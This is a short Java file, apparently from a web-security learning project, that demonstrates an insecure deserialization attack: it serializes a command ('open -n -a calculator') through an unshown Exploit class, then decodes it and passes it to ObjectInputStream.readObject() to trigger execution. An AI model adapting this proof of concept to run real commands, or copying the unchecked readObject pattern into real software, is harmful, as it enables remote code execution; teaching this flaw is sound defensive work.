package com.learn.web.security.deserialization;

import java.io.*;
import java.util.Base64;

public class Attack {
    public static void main(String[] args) throws IOException {
        Exploit exploit = new Exploit();
        String token = exploit.serialize("open -n -a calculator");
        try {
            byte[] data = Base64.getDecoder().decode(token);
            ObjectInputStream is = new ObjectInputStream(new ByteArrayInputStream(data));
            is.readObject();
            is.close();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }

    }
}
